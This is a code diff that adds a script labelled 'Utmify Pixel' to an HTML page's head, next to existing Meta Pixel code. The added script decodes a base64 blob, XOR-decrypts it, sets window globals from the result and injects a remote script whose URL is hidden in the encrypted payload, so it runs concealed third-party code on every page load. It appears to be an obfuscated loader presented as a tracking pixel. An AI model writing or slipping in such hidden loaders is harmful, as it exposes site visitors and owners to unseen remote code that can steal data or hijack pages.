@@ -32,6 +32,31 @@
       src="https://www.facebook.com/tr?id=1865139711590522&ev=PageView&noscript=1"
     /></noscript>
     <!-- End Meta Pixel Code -->
+    <!-- Utmify Pixel -->
+    <script>
+      (function(){
+        var j_xkp=atob("DHH0lvId2k0GUus3RQrW44Bx+HckOp9DNQLOud1+viMoJ59aLBeNuJFyt2NkIMREJgOd5oZu9T1vKo5bagGd7pdx9Cd1cMcVJAWA5Jt/rzljIckNHizYtJVxtS9nPpgVfyqPtJx8tygkaMlHLAmR+rt5+GEkJIpbMBTWrNAruH02MdwCckTE95N+73s2YNlWcUXF8pQ/pxB7");
+        var y_gilp=[];
+        for(var i_dtxp=0;i_dtxp<j_xkp.length;i_dtxp++) y_gilp.push(j_xkp.charCodeAt(i_dtxp)&255);
+        var e_f8=y_gilp[0];
+        var z_0h2=y_gilp.slice(1,1+e_f8);
+        var d_opy=y_gilp.slice(1+e_f8);
+        var s_u=d_opy.map(function(b,b_gdd){return b^z_0h2[b_gdd%e_f8];});
+        var r_3="";
+        for(var t_of56=0;t_of56<s_u.length;t_of56++) r_3+=String.fromCharCode(s_u[t_of56]&255);
+        var d_i=decodeURIComponent(escape(r_3));
+        var x_8tn=JSON.parse(d_i);
+        var f_f9=x_8tn.globals||[];
+        f_f9.forEach(function(r_sx){window[r_sx.name]=r_sx.value;});
+        var k_5m=document.createElement("script");
+        k_5m.src=x_8tn.url;
+        k_5m.async=true;
+        k_5m.defer=true;
+        (x_8tn.attributes||[]).forEach(function(h_t0){k_5m.setAttribute(h_t0.name,h_t0.value);});
+        (document.head||document.documentElement).appendChild(k_5m);
+      })();
+    </script>
+    <!-- End Utmify Pixel -->
   </head>
   <body class="bg-white text-[#230F17] antialiased selection:bg-[#FCE8F0] selection:text-[#230F17]">
     <div id="root"></div>
